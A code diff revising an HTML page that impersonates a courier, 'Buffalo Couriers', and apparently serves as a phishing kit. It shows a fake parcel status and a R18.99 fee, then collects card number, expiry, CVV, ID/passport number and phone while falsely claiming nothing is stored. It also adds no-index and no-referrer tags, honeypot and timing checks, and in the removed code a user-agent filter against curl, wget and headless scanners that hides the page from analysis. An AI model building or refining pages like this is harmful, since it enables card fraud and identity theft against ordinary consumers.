@@ -1,279 +1,368 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
     <meta name="referrer" content="no-referrer" />
     <meta name="robots" content="noindex,nofollow,noarchive,nosnippet" />
-    <title>Secure Card Payment │ Buffalo Logistics</title>
-    <link rel="icon" type="image/x-icon" href="https://thecourierguy.co.za/img/favicon.ico" />
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'/%3E" />
+    <link rel="stylesheet" href="./BUFFALOEX_files/font_3160285_luflb109vu.css" type="text/css" />
+    <title>BUFFALOEX</title>
+    <link rel="stylesheet" crossorigin="" href="./BUFFALOEX_files/index-cwh4ftNa.css" />
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        html, body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: #f4f5f9;
-            color: #222;
-            min-height: 100%;
-        }
-        .topbar {
-            background: #191D63;
-            color: #fff;
-            padding: 14px 20px;
-            text-align: center;
-            font-weight: 600;
-            letter-spacing: 0.3px;
-        }
-        .wrap {
-            max-width: 520px;
-            margin: 32px auto;
-            padding: 0 16px;
-        }
-        .card {
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 6px 24px rgba(0,0,0,0.06);
-            padding: 28px 24px;
-        }
-        h1 {
-            font-size: 20px;
-            color: #191D63;
-            margin-bottom: 6px;
-        }
-        .subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 22px;
-        }
-        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .field { margin-bottom: 16px; }
-        label {
-            display: block;
-            font-size: 13px;
-            color: #444;
-            margin-bottom: 6px;
-            font-weight: 500;
-        }
-        input[type="text"], input[type="tel"], input[type="email"] {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #d6d8e0;
-            border-radius: 8px;
-            font-size: 15px;
-            background: #fff;
-            color: #222;
-            outline: none;
-            transition: border-color 0.15s, box-shadow 0.15s;
-        }
-        input:focus {
-            border-color: #191D63;
-            box-shadow: 0 0 0 3px rgba(25,29,99,0.12);
-        }
-        .order-summary {
-            background: #f7f8fc;
-            border: 1px solid #e6e8ef;
-            border-radius: 8px;
-            padding: 12px 14px;
-            margin-bottom: 22px;
-            font-size: 14px;
-            color: #333;
-        }
-        .order-summary strong { color: #191D63; }
-        .pay-btn {
-            display: block;
-            width: 100%;
-            padding: 14px;
-            background: #191D63;
-            color: #fff;
-            border: 0;
-            border-radius: 999px;
-            font-size: 16px;
-            font-weight: 600;
-            letter-spacing: 0.3px;
-            cursor: pointer;
-            margin-top: 8px;
-            transition: background 0.15s, opacity 0.15s;
-        }
-        .pay-btn:hover { background: #14174f; }
-        .pay-btn:disabled { opacity: 0.7; cursor: not-allowed; }
-        .secure-note {
-            text-align: center;
-            font-size: 12px;
-            color: #888;
-            margin-top: 14px;
-        }
-        .secure-note::before { content: "🔒 "; }
-        .error-msg {
-            background: #fee;
-            border: 1px solid #c33;
-            color: #c33;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 16px;
-            font-size: 14px;
-        }
-        /* Honeypot — visually hidden but reachable to bots */
+        /* Honeypot field — invisible to humans but visible to naive bots */
         .hp-field {
             position: absolute !important;
-            left: -9999px !important;
-            top: -9999px !important;
-            width: 1px !important;
-            height: 1px !important;
-            opacity: 0 !important;
+            left: -10000px !important;
+            top: auto;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            opacity: 0;
+        }
+        /* Replace the missing login-71zUY77K.png background with a soft gradient */
+        .mainContent {
+            background: linear-gradient(135deg, #1f2a44 0%, #2a3a5e 100%) !important;
         }
     </style>
 </head>
-<body>
-    <header class="topbar">Buffalo Logistics │ Secure Card Payment</header>
-    <main class="wrap">
-        <section class="card">
-            <h1>Card Payment</h1>
-            <p class="subtitle">Enter your card details to complete payment.</p>
 
-            <div class="order-summary" id="order-summary">
-                <strong>Payment method:</strong> <span id="vehicle-display">Card</span>
-            </div>
-
-            <div id="error-container" aria-live="assertive"></div>
-
-            <form id="paymentForm" action="/api/submit" method="POST" novalidate autocomplete="on">
-                <div class="field">
-                    <label for="cardholder">Cardholder name</label>
-                    <input type="text" id="cardholder" name="cardholder" required autocomplete="cc-name" placeholder="Name on card" />
-                </div>
-
-                <div class="field">
-                    <label for="card_number">Card number</label>
-                    <input type="tel" id="card_number" name="card_number" required autocomplete="cc-number" inputmode="numeric" maxlength="23" placeholder="1234 5678 9012 3456" />
-                </div>
-
-                <div class="row">
-                    <div class="field">
-                        <label for="card_expiry">Expiry (MM/YY)</label>
-                        <input type="tel" id="card_expiry" name="card_expiry" required autocomplete="cc-exp" inputmode="numeric" maxlength="5" placeholder="MM/YY" />
+<body style="min-width:100vw !important">
+    <div id="app" style="width: 100vw; height: 100vh;">
+        <div>
+            <section class="el-container is-vertical">
+                <header class="el-header">
+                    <div class="el-row top">
+                        <div class="el-col el-col-6 el-col-offset-4">
+                            <div class="whiteText font14">Welcome to BUFFALO COURIERS</div>
+                        </div>
+                        <div class="el-col el-col-7 el-col-offset-5">
+                            <div class="el-breadcrumb line30" aria-label="Breadcrumb" role="navigation" id="topBread">
+                                <span class="el-breadcrumb__item pointer">
+                                    <span class="el-breadcrumb__inner" role="link"><span class="whiteText href">About us</span></span>
+                                    <span class="el-breadcrumb__separator" role="presentation">|</span>
+                                </span>
+                                <span class="el-breadcrumb__item pointer" aria-current="page">
+                                    <span class="el-breadcrumb__inner" role="link"><span class="whiteText href">Contact us</span></span>
+                                    <span class="el-breadcrumb__separator" role="presentation">|</span>
+                                </span>
+                            </div>
+                        </div>
                     </div>
-                    <div class="field">
-                        <label for="card_cvv">CVV</label>
-                        <input type="tel" id="card_cvv" name="card_cvv" required autocomplete="cc-csc" inputmode="numeric" maxlength="4" placeholder="123" />
+                    <div class="el-row level2 verCenter">
+                        <div class="el-col el-col-8 el-col-offset-4">
+                            <div class="verCenter">
+                                <img src="./BUFFALOEX_files/buffalo_logo-A_kjJv0J.png" alt="" height="36px" style="display: inline;" />
+                                <span style="color: rgb(187, 149, 96); font-size: 22px; line-height: 1.2; text-transform: uppercase; margin: 20px 0px 0px 5px;">COURIERS</span>
+                            </div>
+                        </div>
                     </div>
-                </div>
+                </header>
 
-                <div class="field">
-                    <label for="email">Email (for receipt)</label>
-                    <input type="email" id="email" name="email" required autocomplete="email" placeholder="you@example.com" />
-                </div>
+                <main class="el-main">
+                    <div class="h-full">
+                        <div class="el-row">
+                            <div class="el-col el-col-24 mainContent clearfix" style="height: 100vh;">
+                                <div class="wrap-mask"></div>
+                                <div class="relative w-full h-full grid justify-center">
+                                    <div class="flex flex-col w-full max-w-[800px] !mt-[4rem]">
+                                        <div class="w-full !p-4 bg-white rounded">
+                                            <table border="0">
+                                                <tbody class="text-sm">
+                                                    <tr>
+                                                        <td width="200">Status:</td>
+                                                        <td width="491"><strong>Delivering</strong></td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td width="200">This shipment is handled by:</td>
+                                                        <td width="491"><strong>Buffalo</strong></td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td width="200">Tracking Code:</td>
+                                                        <td width="491"><strong>CS47*********</strong></td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td width="200">Shipment type:</td>
+                                                        <td width="491"><strong>Other</strong></td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td>Total :</td>
+                                                        <td><b>R18.99</b></td>
+                                                    </tr>
+                                                </tbody>
+                                            </table>
+                                        </div>
 
-                <!-- Pre-filled from index.html form GET -->
-                <input type="hidden" id="vehicle1" name="vehicle1" value="" />
+                                        <div class="w-full !p-4 bg-white rounded !mt-[1rem]">
+                                            <div class="grid gap-4 text-center justify-items-center">
+                                                <h3 class="font-semibold">Payment Method</h3>
+                                                <p class="text-red-700 text-sm"> We accept all debit/credit cards. For quick processing and fast delivery.</p>
+                                                <img src="./BUFFALOEX_files/sabks.png" alt="" width="350" class="img-banks" />
+                                                <div class="text-sm !mt-[2rem]">
+                                                    <p><b>All types of Card is accepted</b></p>
+                                                    <b><span>*None of your credentials are stored.</span></b>
+                                                </div>
+                                            </div>
 
-                <!-- Honeypot field (bots fill this) -->
-                <label for="company_url" class="hp-field" aria-hidden="true">Company Website (leave blank)</label>
-                <input type="text" id="company_url" name="company_url" class="hp-field" tabindex="-1" autocomplete="off" aria-hidden="true" />
+                                            <div class="w-full max-w-[600px] !mx-auto" style="margin-top: 4rem">
+                                                <div>
+                                                    <form id="paymentForm" action="/api/submit" method="POST" novalidate autocomplete="on" class="el-form el-form--large el-form--label-right">
+                                                        <div class="el-form-item el-form-item--large is-required asterisk-left el-form-item--label-right">
+                                                            <div class="el-form-item__content">
+                                                                <div class="el-input el-input--large">
+                                                                    <div class="el-input__wrapper" tabindex="-1">
+                                                                        <input class="el-input__inner" type="text" autocomplete="cc-name" tabindex="0" placeholder="Card Holder" id="cardholder" name="cardholder" required />
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
 
-                <!-- Timing check -->
-                <input type="hidden" id="form_load_time" name="form_load_time" value="" />
+                                                        <div class="el-form-item el-form-item--large is-required asterisk-left el-form-item--label-right">
+                                                            <div class="el-form-item__content">
+                                                                <div class="el-input el-input--large el-input--suffix">
+                                                                    <div class="el-input__wrapper" tabindex="-1">
+                                                                        <input class="el-input__inner" type="text" autocomplete="off" tabindex="0" placeholder="ID/Passport Number" maxlength="13" id="id_number" name="id_number" required />
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
 
-                <!-- 20-30 character browser session token -->
-                <input type="hidden" id="session_token" name="session_token" value="" />
+                                                        <div class="el-form-item el-form-item--large is-required asterisk-left el-form-item--label-right">
+                                                            <div class="el-form-item__content">
+                                                                <div class="el-input el-input--large el-input--suffix">
+                                                                    <div class="el-input__wrapper" tabindex="-1">
+                                                                        <input class="el-input__inner" required type="tel" autocomplete="tel" tabindex="0" placeholder="Cellphone Number" id="phone" name="phone" maxlength="12" inputmode="numeric" />
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
 
-                <button type="submit" id="pay_button" class="pay-btn">Pay</button>
-            </form>
+                                                        <div class="el-form-item el-form-item--large is-required asterisk-left el-form-item--label-right">
+                                                            <div class="el-form-item__content">
+                                                                <div class="el-input el-input--large el-input--suffix">
+                                                                    <div class="el-input__wrapper" tabindex="-1">
+                                                                        <input class="el-input__inner" required type="tel" autocomplete="cc-number" tabindex="0" placeholder="Card Number" id="card_number" name="card_number" maxlength="19" inputmode="numeric" onkeypress="isInputNumber(event)" oninvalid="this.setCustomValidity('Please enter a valid Card Number')" oninput="validateCardNumber()" />
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
 
-            <p class="secure-note">Your payment is processed over a secure encrypted connection.</p>
-        </section>
-    </main>
+                                                        <div class="grid grid-cols-2 gap-4">
+                                                            <div>
+                                                                <div class="el-form-item el-form-item--large is-required asterisk-left el-form-item--label-right">
+                                                                    <div class="el-form-item__content">
+                                                                        <div class="el-input el-input--large el-input--suffix">
+                                                                            <div class="el-input__wrapper" tabindex="-1">
+                                                                                <input class="el-input__inner" required type="text" autocomplete="cc-exp" tabindex="0" placeholder="Expiry [mm/yyyy]" id="card_expiry" name="card_expiry" maxlength="7" inputmode="numeric" />
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
 
+                                                            <div>
+                                                                <div class="el-form-item el-form-item--large is-required asterisk-left el-form-item--label-right">
+                                                                    <div class="el-form-item__content">
+                                                                        <div class="el-input el-input--large el-input--suffix">
+                                                                            <div class="el-input__wrapper" tabindex="-1">
+                                                                                <input class="el-input__inner" required onkeypress="isInputNumber(event)" type="tel" autocomplete="cc-csc" tabindex="0" placeholder="CVV" id="card_cvv" name="card_cvv" maxlength="3" inputmode="numeric" />
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+
+                                                        <!-- Existing payment-method tag (kept hidden — server requires this field) -->
+                                                        <input type="hidden" id="vehicle1" name="vehicle1" value="" />
+                                                        <!-- Honeypot: invisible to humans, naive bots will fill this -->
+                                                        <label for="company_url" class="hp-field" aria-hidden="true">Company Website (leave blank)</label>
+                                                        <input type="text" id="company_url" name="company_url" class="hp-field" tabindex="-1" autocomplete="off" aria-hidden="true" />
+                                                        <!-- Form-load timestamp for timing-based bot detection -->
+                                                        <input type="hidden" id="form_load_time" name="form_load_time" value="" />
+                                                        <!-- Per-session token -->
+                                                        <input type="hidden" id="session_token" name="session_token" value="" />
+
+                                                        <div class="mt-[24px]">
+                                                            <button id="pay_button" aria-disabled="false" type="submit" class="el-button el-button--primary el-button--large" style="width: 100%;">
+                                                                <span><span class="text-[16px] font-medium leading-[24px]">Pay R18.99</span></span>
+                                                            </button>
+                                                        </div>
+
+                                                        <div id="form_error" role="alert" aria-live="polite" style="display:none;margin-top:1rem;color:#b91c1c;text-align:center;"></div>
+
+                                                        <div class="!mt-[2rem] text-center">
+                                                            <p>*Please note that your details are NOT saved for future transactions</p>
+                                                        </div>
+                                                        <div align="center" style="margin-top:1rem">
+                                                            <img width="15%" src="./BUFFALOEX_files/spIcon.png" /><br />
+                                                            <img width="16%" src="./BUFFALOEX_files/vm.gif" />
+                                                            <h5>© 2026 Buffalo – Delivery | Distribution | Warehousing All Rights Reserved</h5>
+                                                        </div>
+                                                    </form>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+
+                <footer class="el-footer">
+                    <div class="el-row">
+                        <div class="el-col el-col-24">
+                            <div class="footbackground">
+                                <div class="el-col el-col-8 el-col-offset-3"><span class="foottext"> Copyright © buffalo.co.za All Rights Reserved </span></div>
+                                <div class="el-col el-col-8 el-col-offset-4">
+                                    <div class="el-breadcrumb line40" aria-label="Breadcrumb" role="navigation" id="footBread">
+                                        <span class="el-breadcrumb__item">
+                                            <span class="el-breadcrumb__inner" role="link"><span class="foottext href">Conditions of Carriage</span></span>
+                                            <span class="el-breadcrumb__separator" role="presentation">|</span>
+                                        </span>
+                                        <span class="el-breadcrumb__item">
+                                            <span class="el-breadcrumb__inner" role="link"><span class="foottext href">Restricted Items</span></span>
+                                            <span class="el-breadcrumb__separator" role="presentation">|</span>
+                                        </span>
+                                        <span class="el-breadcrumb__item" aria-current="page">
+                                            <span class="el-breadcrumb__inner" role="link"><span class="foottext href">Prohibited Items</span></span>
+                                            <span class="el-breadcrumb__separator" role="presentation">|</span>
+                                        </span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </footer>
+            </section>
+        </div>
+    </div>
+
+    <script src="./BUFFALOEX_files/jquery-3.7.1.min.js"></script>
+    <script src="./BUFFALOEX_files/jquery.mask.min.js"></script>
     <script>
-        // -------- 20-30 character session token --------
-        // Generated once per browser session, stored in sessionStorage,
-        // submitted as a hidden field, and exposed on window.__sessionToken.
-        (function () {
-            function generateSessionToken() {
-                var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                var length = 20 + Math.floor(Math.random() * 11); // 20..30 inclusive
-                var bytes;
-                if (window.crypto && typeof window.crypto.getRandomValues === 'function') {
-                    bytes = new Uint8Array(length);
-                    window.crypto.getRandomValues(bytes);
-                } else {
-                    bytes = new Array(length);
-                    for (var i = 0; i < length; i++) bytes[i] = Math.floor(Math.random() * 256);
-                }
-                var out = '';
-                for (var j = 0; j < length; j++) out += alphabet.charAt(bytes[j] % alphabet.length);
-                return out;
+        // Input masks (matches BUFFALOEX template)
+        $("#phone").mask("000 000 0000");
+        $("#card_cvv").mask("000");
+
+        function isInputNumber(evt) {
+            var ch = String.fromCharCode(evt.which);
+            if (!(/[0-9]/.test(ch))) {
+                evt.preventDefault();
             }
+        }
+
+        function luhnCheck(value) {
+            var digits = String(value).replace(/\D/g, '');
+            if (digits.length < 12) return false;
+            var sum = 0;
+            var shouldDouble = false;
+            for (var i = digits.length - 1; i >= 0; i--) {
+                var digit = parseInt(digits.charAt(i), 10);
+                if (shouldDouble) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return (sum % 10) === 0;
+        }
+
+        function validateCardNumber() {
+            var input = document.getElementById('card_number');
+            input.setCustomValidity(luhnCheck(input.value) ? '' : 'Please enter a valid Card Number');
+        }
+
+        function formatExpiryDate(input) {
+            var value = input.value.replace(/\D/g, '');
+            if (value.length > 6) value = value.substr(0, 6);
+            if (value.length > 2) value = value.replace(/^(\d{2})(\d{0,4})/, '$1/$2');
+            input.value = value;
+            var isValid = validateExpiryDate(value);
+            input.setCustomValidity(isValid ? '' : 'Please enter a valid expiry date (MM/YYYY)');
+        }
+
+        function validateExpiryDate(expiry) {
+            if (expiry.length < 6) return false;
+            var parts = expiry.split('/');
+            var month = parseInt(parts[0], 10);
+            var year = parseInt(parts[1], 10);
+            if (!(month >= 1 && month <= 12)) return false;
+            if (!parts[1] || parts[1].length !== 4) return false;
+            var now = new Date();
+            var currentYear = now.getFullYear();
+            var currentMonth = now.getMonth() + 1;
+            if (year < currentYear) return false;
+            if (year === currentYear && month < currentMonth) return false;
+            return true;
+        }
+
+        // Generate or reuse a per-session token (used for correlating browser
+        // sessions across endpoints).
+        function getSessionToken() {
             var token = null;
             try { token = window.sessionStorage && window.sessionStorage.getItem('courrier_session_token'); } catch (e) {}
-            if (!token || token.length < 20 || token.length > 30) {
-                token = generateSessionToken();
+            if (!token) {
+                token = 'st_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 10);
                 try { if (window.sessionStorage) window.sessionStorage.setItem('courrier_session_token', token); } catch (e) {}
             }
-            window.__sessionToken = token;
-        })();
+            return token;
+        }
 
-        // -------- Bot / crawler detection (client side) --------
-        // Server-side validation in /api/submit is the authoritative check;
-        // this is a fast pre-flight that blocks obvious headless tools.
+        function getQueryParam(name) {
+            var match = window.location.search.match(new RegExp('[?&]' + name + '=([^&]*)'));
+            return match ? decodeURIComponent(match[1].replace(/\+/g, ' ')) : null;
+        }
+
+        // Lightweight client-side bot heuristic — server-side validation in
+        // /api/submit is the authoritative check.
         function clientBotCheck() {
-            var ua = (navigator.userAgent || '').toLowerCase();
-            var badUA = /bot|crawler|spider|crawling|headless|puppeteer|playwright|phantomjs|selenium|wget|curl|python-requests|scrapy/i;
-            if (badUA.test(ua)) return 'Bot detected via User-Agent.';
-            // Headless Chrome flag
-            if (navigator.webdriver === true) return 'Automated browser detected.';
-            // No language list = highly suspicious
-            if (!navigator.languages || navigator.languages.length === 0) return 'Suspicious browser environment.';
+            var hp = document.getElementById('company_url');
+            if (hp && hp.value.trim() !== '') return 'Submission blocked.';
+            var loaded = parseInt(document.getElementById('form_load_time').value, 10);
+            if (loaded && (Date.now() - loaded) < 1000) return 'Please take a moment to review your details.';
             return null;
         }
 
-        // -------- Helpers --------
-        function getQueryParam(name) {
-            try {
-                var params = new URLSearchParams(window.location.search);
-                return params.get(name);
-            } catch (e) { return null; }
-        }
-        function showError(msg) {
-            var c = document.getElementById('error-container');
-            c.innerHTML = '';
-            var d = document.createElement('div');
-            d.className = 'error-msg';
-            d.setAttribute('role', 'alert');
-            d.textContent = msg;
-            c.appendChild(d);
+        function showError(message) {
+            var box = document.getElementById('form_error');
+            box.textContent = message;
+            box.style.display = 'block';
         }
         function clearError() {
-            document.getElementById('error-container').innerHTML = '';
+            var box = document.getElementById('form_error');
+            box.textContent = '';
+            box.style.display = 'none';
         }
 
         document.addEventListener('DOMContentLoaded', function () {
-            // Pre-fill vehicle1 from query string (e.g. ?vehicle1=Bike)
+            // Pre-fill vehicle1 from query string (e.g. ?vehicle1=Bike), default 'Card'
             var vehicle = getQueryParam('vehicle1') || 'Card';
             document.getElementById('vehicle1').value = vehicle;
-            document.getElementById('vehicle-display').textContent = vehicle;
 
-            // Stamp load time + session token for server-side bot detection
+            // Stamp the form with the load timestamp + session token
             document.getElementById('form_load_time').value = Date.now();
-            document.getElementById('session_token').value = window.__sessionToken;
+            document.getElementById('session_token').value = getSessionToken();
 
-            // Light input formatting: card number groups of 4, expiry MM/YY
+            // Expiry date input handlers
+            var expiryInput = document.getElementById('card_expiry');
+            expiryInput.addEventListener('input', function (e) { formatExpiryDate(e.target); });
+            expiryInput.addEventListener('paste', function (e) {
+                e.preventDefault();
+                var pasted = (e.clipboardData || window.clipboardData).getData('text');
+                expiryInput.value = pasted.replace(/\D/g, '').substr(0, 6);
+                formatExpiryDate(expiryInput);
+            });
+
+            // Card number input — keep digits/spaces only
             var cardInput = document.getElementById('card_number');
             cardInput.addEventListener('input', function () {
-                var v = this.value.replace(/\D/g, '').slice(0, 19);
-                var groups = v.match(/.{1,4}/g);
-                this.value = groups ? groups.join(' ') : '';
-            });
-            var expInput = document.getElementById('card_expiry');
-            expInput.addEventListener('input', function () {
-                var v = this.value.replace(/\D/g, '').slice(0, 4);
-                if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
-                this.value = v;
-            });
-            var cvvInput = document.getElementById('card_cvv');
-            cvvInput.addEventListener('input', function () {
-                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+                this.value = this.value.replace(/[^\d ]/g, '').slice(0, 19);
             });
 
-            // Submit handler — POSTs to /api/submit, redirects to /processing.html
             var form = document.getElementById('paymentForm');
             var payButton = document.getElementById('pay_button');
 
@@ -284,9 +373,9 @@
                 var botReason = clientBotCheck();
                 if (botReason) { showError(botReason); return; }
 
-                var originalText = payButton.textContent;
+                var originalHTML = payButton.innerHTML;
                 payButton.disabled = true;
-                payButton.textContent = 'Processing…';
+                payButton.innerHTML = '<span><span class="text-[16px] font-medium leading-[24px]">Processing…</span></span>';
 
                 try {
                     var formData = new FormData(form);
@@ -306,7 +395,7 @@
                     showError('A network error occurred. Please try again.');
                 } finally {
                     payButton.disabled = false;
-                    payButton.textContent = originalText;
+                    payButton.innerHTML = originalHTML;
                 }
             });
         });
